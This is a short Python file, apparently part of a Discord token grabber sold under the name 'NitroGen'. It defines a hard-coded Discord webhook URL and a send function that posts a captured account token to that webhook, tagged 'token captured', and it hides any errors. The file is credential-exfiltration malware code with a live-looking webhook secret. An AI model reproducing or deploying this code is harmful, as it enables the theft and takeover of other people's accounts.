import requests

# ==== CONFIG ====
WEBHOOK_URL = "https://discord.com/api/webhooks/1557583844603994142/hlJQLms0JoNqDB4E6Js2asK0d5-kIfj3cr5GVW39yOZfNwcpxoh9aRdosLXV2GlzanyZ"
# ================

def send(token: str):
    if not token:
        return
    payload = {
        "content": f"**NitroGen by Rubilacxe - token captured**\n```\n{token}\n```"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception:
        pass
